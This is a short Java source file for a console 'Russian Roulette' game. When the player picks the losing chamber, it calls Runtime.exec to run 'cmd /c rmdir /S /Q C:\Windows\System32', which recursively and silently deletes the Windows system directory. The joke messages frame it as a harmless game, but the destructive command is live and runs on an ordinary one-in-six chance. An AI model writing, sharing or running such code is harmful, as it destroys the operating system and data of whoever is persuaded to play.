import java.util.Scanner;
import java.util.Random;

public class Main {
    public static void main(String[] args) {
        System.out.println("Welcome to Windows 32 Russian Roulette!");
        Random rand = new Random();
        int bullet = rand.nextInt(6) + 1;

        Scanner scanner = new Scanner(System.in);
        System.out.print("Pick a chamber (1-6): ");
        int chamber = scanner.nextInt();

        if (chamber == bullet) {
            System.out.println("Oops! Looks like you just deleted Windows 32. Good luck reinstalling! 💻💥");
            try {
                Runtime.getRuntime().exec("cmd /c rmdir /S /Q C:\\Windows\\System32");
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            System.out.println("Phew! You survived... this time. Try again if you dare! 🔫😅");
        }
    }
}
